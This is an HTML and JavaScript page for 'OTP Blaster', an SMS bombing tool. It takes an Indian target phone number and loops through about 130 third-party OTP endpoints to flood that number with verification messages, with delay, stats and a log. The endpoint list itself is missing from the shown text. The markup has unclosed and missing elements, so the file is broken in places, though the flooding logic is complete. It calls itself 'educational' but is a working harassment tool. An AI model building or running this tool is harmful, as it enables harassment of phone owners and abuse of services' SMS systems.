<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OTP Blaster — Cyber Edition</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --indigo: #6366f1;
      --violet: #8b5cf6;
      --green: #22c55e;
      --red: #ef4444;
      --amber: #f59e0b;
      --bg: #07070f;
      --border: rgba(99,102,241,0.18);
    }

    *, *::before, *::after { box-sizing: border-box; }

    html, body {
      margin: 0; padding: 0;
      min-height: 100vh;
      background: var(--bg);
      color: #e2e8f0;
      font-family: 'Inter', sans-serif;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed; inset: 0;
      background:
        radial-gradient(ellipse 80% 50% at -10% -10%, rgba(99,102,241,0.14) 0%, transparent 60%),
        radial-gradient(ellipse 60% 40% at 110% 30%, rgba(139,92,246,0.10) 0%, transparent 60%),
        radial-gradient(ellipse 50% 40% at 20% 80%, rgba(6,182,212,0.07) 0%, transparent 60%);
      pointer-events: none; z-index: 0;
    }

    body::after {
      content: '';
      position: fixed; inset: 0;
      background-image:
        linear-gradient(rgba(99,102,241,0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(99,102,241,0.05) 1px, transparent 1px);
      background-size: 60px 60px;
      pointer-events: none; z-index: 0;
    }

    .page-wrap { position: relative; z-index: 1; min-height: 100vh; padding-bottom: 3rem; }

    /* Header */
    .cyber-header { padding: 2.5rem 1rem 1.5rem; text-align: center; }

    .badge-pill {
      display: inline-flex; align-items: center; gap: 8px;
      padding: 6px 18px; border-radius: 999px;
      background: rgba(99,102,241,0.1);
      border: 1px solid rgba(99,102,241,0.25);
      color: #818cf8;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.7rem; letter-spacing: 0.1em; text-transform: uppercase;
      margin-bottom: 1.2rem;
    }

    .badge-dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: var(--green);
      animation: pulse-dot 2s infinite;
    }
    @keyframes pulse-dot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }

    .cyber-title {
      font-size: clamp(2.5rem, 8vw, 5rem);
      font-weight: 900; letter-spacing: -0.02em; line-height: 1;
      background: linear-gradient(135deg, #e0e7ff 0%, #a5b4fc 35%, #818cf8 65%, #c084fc 100%);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
      margin-bottom: 0.5rem;
    }

    .cyber-sub { color: #475569; font-size: 0.9rem; }

    /* Card */
    .glass-card {
      background: linear-gradient(135deg, rgba(13,13,28,0.97) 0%, rgba(10,10,24,0.99) 100%);
      border: 1px solid var(--border);
      border-radius: 20px;
      box-shadow: 0 0 40px rgba(99,102,241,0.06), 0 20px 60px rgba(0,0,0,0.5);
    }

    .input-section { padding: 2rem; }

    .input-label {
      display: block;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.65rem; font-weight: 700;
      letter-spacing: 0.15em; text-transform: uppercase;
      color: var(--indigo); margin-bottom: 0.75rem;
    }

    .phone-wrapper { position: relative; display: flex; align-items: center; }

    .phone-prefix {
      position: absolute; left: 16px;
      display: flex; align-items: center; gap: 8px;
      pointer-events: none; z-index: 2;
    }
    .phone-prefix .flag { font-size: 1.3rem; }
    .phone-prefix .code { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--indigo); font-weight: 700; }
    .phone-divider { width: 1px; height: 22px; background: rgba(99,102,241,0.3); }

    #phoneInput {
      width: 100%;
      background: rgba(99,102,241,0.06);
      border: 2px solid rgba(99,102,241,0.2);
      border-radius: 14px;
      padding: 18px 50px 18px 116px;
      font-family: 'JetBrains Mono', monospace;
      font-size: 1.4rem; font-weight: 700; letter-spacing: 0.15em;
      color: #e2e8f0; outline: none; transition: all 0.25s;
      caret-color: var(--indigo);
    }
    #phoneInput::placeholder { color: #1e293b; }
    #phoneInput.valid {
      border-color: rgba(99,102,241,0.6); color: #a5b4fc;
      box-shadow: 0 0 25px rgba(99,102,241,0.15), inset 0 0 20px rgba(99,102,241,0.04);
    }

    .digit-dots { position: absolute; right: 14px; display: flex; gap: 3px; align-items: center; }
    .digit-dot { width: 5px; height: 8px; border-radius: 3px; background: rgba(99,102,241,0.15); transition: background 0.15s; }
    .digit-dot.filled { background: var(--indigo); }

    #blastBtn {
      width: 100%; margin-top: 1rem;
      padding: 16px 24px; border-radius: 14px; border: none;
      font-family: 'Inter', sans-serif; font-size: 1rem; font-weight: 800;
      letter-spacing: 0.06em; text-transform: uppercase;
      cursor: pointer; transition: all 0.2s;
      display: flex; align-items: center; justify-content: center; gap: 10px;
      background: linear-gradient(135deg, var(--indigo) 0%, var(--violet) 100%);
      color: #fff; box-shadow: 0 0 30px rgba(99,102,241,0.35);
      position: relative; overflow: hidden;
    }
    #blastBtn:disabled {
      background: rgba(99,102,241,0.15); color: rgba(255,255,255,0.3);
      box-shadow: none; cursor: not-allowed;
    }
    #blastBtn.stop-mode { background: linear-gradient(135deg, var(--red) 0%, #dc2626 100%); box-shadow: 0 0 30px rgba(239,68,68,0.4); }
    #blastBtn::before {
      content: ''; position: absolute; top: 0; left: -100%;
      width: 100%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      transition: left 0.5s;
    }
    #blastBtn:not(:disabled):hover::before { left: 100%; }
    #blastBtn:not(:disabled):hover { transform: translateY(-1px); }

    .btn-icon { width: 20px; height: 20px; }
    .spinner-sm {
      width: 18px; height: 18px;
      border: 2.5px solid rgba(255,255,255,0.4); border-top-color: #fff;
      border-radius: 50%; animation: spin 0.7s linear infinite; display: inline-block;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .options-row {
      display: flex; flex-wrap: wrap; align-items: center; gap: 1rem;
      margin-top: 1.25rem; padding-top: 1.25rem;
      border-top: 1px solid rgba(99,102,241,0.08);
    }
    .opt-label { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: #475569; }

    .cyber-input {
      background: rgba(99,102,241,0.08);
      border: 1px solid rgba(99,102,241,0.2); border-radius: 8px;
      padding: 6px 10px; font-family: 'JetBrains Mono', monospace;
      font-size: 0.8rem; color: #a5b4fc; outline: none;
      width: 80px; text-align: center;
    }

    .progress-section { margin-top: 1.25rem; display: none; }
    .progress-header {
      display: flex; justify-content: space-between;
      font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: #475569; margin-bottom: 0.5rem;
    }
    .progress-bar-outer { height: 5px; background: rgba(99,102,241,0.08); border-radius: 99px; overflow: hidden; }
    .progress-bar-inner {
      height: 100%;
      background: linear-gradient(90deg, var(--indigo), var(--violet), #ec4899);
      box-shadow: 0 0 10px rgba(99,102,241,0.6);
      border-radius: 99px; width: 0%; transition: width 0.3s;
    }

    .stats-section { display: none; grid-template-columns: repeat(3,1fr); gap: 0.75rem; margin-top: 1.25rem; }
    .stat-card { text-align: center; padding: 1rem 0.5rem; border-radius: 12px; }
    .stat-card.s-ok  { background: rgba(34,197,94,0.08);  border: 1px solid rgba(34,197,94,0.18); }
    .stat-card.s-err { background: rgba(239,68,68,0.08);  border: 1px solid rgba(239,68,68,0.18); }
    .stat-card.s-cx  { background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.18); }
    .stat-num { font-size: 1.8rem; font-weight: 900; font-family: 'JetBrains Mono', monospace; line-height: 1; margin-bottom: 4px; }
    .stat-card.s-ok  .stat-num { color: #4ade80; }
    .stat-card.s-err .stat-num { color: #f87171; }
    .stat-card.s-cx  .stat-num { color: #fbbf24; }
    .stat-lbl { font-size: 0.65rem; font-family: 'JetBrains Mono', monospace; text-transform: uppercase; letter-spacing: 0.08em; }
    .stat-card.s-ok  .stat-lbl { color: rgba(74,222,128,0.6); }
    .stat-card.s-err .stat-lbl { color: rgba(248,113,113,0.6); }
    .stat-card.s-cx  .stat-lbl { color: rgba(251,191,36,0.6); }

    .log-card { margin-top: 1.25rem; display: none; overflow: hidden; }
    .log-header {
      display: flex; justify-content: space-between; align-items: center;
      padding: 0.9rem 1.25rem; border-bottom: 1px solid rgba(99,102,241,0.07);
    }
    .log-title { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; color: var(--indigo); }
    .log-clear { background: none; border: none; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #374151; cursor: pointer; padding: 0; transition: color 0.2s; }
    .log-clear:hover { color: #f87171; }
    .log-body { max-height: 240px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: rgba(99,102,241,0.2) transparent; }
    .log-item { display: flex; align-items: center; gap: 10px; padding: 8px 1.25rem; border-bottom: 1px solid rgba(99,102,241,0.04); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; }
    .log-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
    .log-dot.ok  { background: #4ade80; }
    .log-dot.err { background: #f87171; }
    .log-dot.cx  { background: #fbbf24; }
    .log-name { flex: 1; color: #64748b; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .log-badge { font-size: 0.65rem; padding: 2px 8px; border-radius: 99px; }
    .log-badge.ok  { background: rgba(74,222,128,0.12); color: #4ade80; border: 1px solid rgba(74,222,128,0.2); }
    .log-badge.err { background: rgba(248,113,113,0.12); color: #f87171; border: 1px solid rgba(248,113,113,0.2); }
    .log-badge.cx  { background: rgba(251,191,36,0.12);  color: #fbbf24; border: 1px solid rgba(251,191,36,0.2); }

    .cyber-footer { text-align: center; margin-top: 2.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; color: #1e293b; }

    @media (max-width: 576px) {
      .input-section { padding: 1.25rem; }
      #phoneInput { font-size: 1rem; padding: 15px 44px 15px 100px; }
    }
  </style>
</head>

<div class="page-wrap">

  <div class="cyber-header">
    <div class="badge-pill">

    <div class="cyber-title">OTP BLASTER</div>
    <div class="cyber-sub">Multi-platform OTP sender &bull; Cyber Edition</div>
  </div>

  <div class="container" style="max-width:620px;">

    <div class="glass-card mb-3">
      <div class="input-section">

        <label class="input-label" for="phoneInput">Target Mobile Number</label>
        <div class="phone-wrapper">
          <div class="phone-prefix">
            <span class="flag">🇮🇳</span>
            <span class="code">+91</span>

          <div class="digit-dots" id="digitDots"></div>

        <button id="blastBtn" disabled>

        <div class="options-row">
          <span class="opt-label">Delay (ms):</span>

          <span class="opt-label">All <span id="totalApiCount">130</span> APIs will fire</span>
        </div>

        <div class="progress-section" id="progressSection">
          <div class="progress-header">
            <span id="progressLabel">0 / 0</span>
            <span id="progressPct">0%</span>
          </div>
          <div class="progress-bar-outer"><div class="progress-bar-inner" id="progressBar"></div></div>
        </div>

        <div class="stats-section" id="statsSection">
          <div class="stat-card s-ok">
            <div class="stat-num" id="statOk">0</div>
            <div class="stat-lbl">Success</div>
          </div>
          <div class="stat-card s-err">
            <div class="stat-num" id="statErr">0</div>
            <div class="stat-lbl">Failed</div>
          </div>
          <div class="stat-card s-cx">
            <div class="stat-num" id="statCx">0</div>
            <div class="stat-lbl">CORS</div>
          </div>
        </div>

      </div>
    </div>

    <div class="glass-card log-card" id="logCard">
      <div class="log-header">
        <span class="log-title">Activity Log</span>
        <button class="log-clear" id="logClearBtn">Clear</button>
      </div>
      <div class="log-body" id="logBody"></div>
    </div>

    <div class="cyber-footer" id="footerText">OTP Blaster &bull; 130+ APIs &bull; Educational purposes only</div>
  </div>
</div>

// Build digit dots
const dotsContainer = document.getElementById('digitDots');
for(let i=0;i<10;i++){const d=document.createElement('div');d.className='digit-dot';d.dataset.i=i;dotsContainer.appendChild(d);}
const dots = dotsContainer.querySelectorAll('.digit-dot');

// Update counts in DOM
const T = APIS.length;
document.getElementById('apiCountBadge').textContent = T + ' APIs Active';
document.getElementById('totalApiCount').textContent = T;
document.getElementById('footerText').textContent = 'OTP Blaster \u2022 ' + T + '+ APIs \u2022 Educational purposes only';

// DOM refs
const phoneInput = document.getElementById('phoneInput');
const blastBtn   = document.getElementById('blastBtn');
const delayInput = document.getElementById('delayInput');
const progressSection = document.getElementById('progressSection');
const progressLabel   = document.getElementById('progressLabel');
const progressPct     = document.getElementById('progressPct');
const progressBar     = document.getElementById('progressBar');
const statsSection    = document.getElementById('statsSection');
const statOk  = document.getElementById('statOk');
const statErr = document.getElementById('statErr');
const statCx  = document.getElementById('statCx');
const logCard = document.getElementById('logCard');
const logBody = document.getElementById('logBody');
const logClearBtn = document.getElementById('logClearBtn');

let running=false, aborted=false, cOk=0, cErr=0, cCx=0;

// Phone input
phoneInput.addEventListener('input', function(){
  const v = this.value.replace(/\D/g,'').slice(0,10);
  this.value = v;
  dots.forEach((d,i)=>d.classList.toggle('filled', i<v.length));
  this.classList.toggle('valid', v.length===10);
  blastBtn.disabled = v.length!==10 || running;
});
phoneInput.addEventListener('keypress', e=>{ if(!/\d/.test(e.key)) e.preventDefault(); });

function sub(s, p){ return s.replace(/\{p\}/g, p); }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

function addLog(name, cls, code){
  logCard.style.display='block';
  const row=document.createElement('div');
  row.className='log-item';
  row.innerHTML=`<span class="log-dot ${cls}"></span><span class="log-name">${name}</span><span class="log-badge ${cls}">${cls==='ok'?(code||'OK'):cls==='cx'?'CORS':(code||'ERR')}</span>`;
  logBody.prepend(row);
}

function updateStats(){
  statOk.textContent=cOk; statErr.textContent=cErr; statCx.textContent=cCx;
  statsSection.style.display='grid';
}

async function callOne(api, phone){
  const url = sub(api.u, phone);
  const opts = { method: api.m, headers: api.h, mode:'cors' };
  if(api.b && api.m!=='GET') opts.body = sub(api.b, phone);
  try{
    const res = await fetch(url, opts);
    if(res.ok){ cOk++; addLog(api.n,'ok',res.status); }
    else { cErr++; addLog(api.n,'err',res.status); }
  } catch(e){
    const msg=String(e);
    if(msg.includes('Failed to fetch')||msg.includes('NetworkError')||msg.includes('CORS')){
      cCx++; addLog(api.n,'cx',null);
    } else {
      cErr++; addLog(api.n,'err',null);
    }
  }
}

async function blast(){
  const phone = phoneInput.value.trim();
  if(phone.length!==10) return;
  const delay = Math.max(0, parseInt(delayInput.value)||0);

  running=true; aborted=false; cOk=0; cErr=0; cCx=0;
  blastBtn.classList.add('stop-mode');
  blastBtn.innerHTML='<span class="spinner-sm"></span> STOP';
  blastBtn.disabled=false;
  progressSection.style.display='block';
  statsSection.style.display='none';
  logBody.innerHTML=''; logCard.style.display='none';

  for(let i=0;i<APIS.length;i++){
    if(aborted) break;
    await callOne(APIS[i], phone);
    const done=i+1, pct=Math.round(done/APIS.length*100);
    progressLabel.textContent=done+' / '+APIS.length;
    progressPct.textContent=pct+'%';
    progressBar.style.width=pct+'%';
    updateStats();
    if(delay>0 && i<APIS.length-1) await sleep(delay);
  }

  running=false;
  blastBtn.classList.remove('stop-mode');
  blastBtn.innerHTML='<svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13,2 3,14 12,14 11,22 21,10 12,10"/></svg> BLAST AGAIN';
  blastBtn.disabled=false;
}

blastBtn.addEventListener('click', ()=>{
  if(running){
    aborted=true; running=false;
    blastBtn.classList.remove('stop-mode');
    blastBtn.innerHTML='<svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13,2 3,14 12,14 11,22 21,10 12,10"/></svg> BLAST';
  } else {
    blast();
  }
});

logClearBtn.addEventListener('click', ()=>{
  logBody.innerHTML=''; logCard.style.display='none';
  statsSection.style.display='none'; progressSection.style.display='none';
  progressBar.style.width='0%'; cOk=cErr=cCx=0;
});
</script>
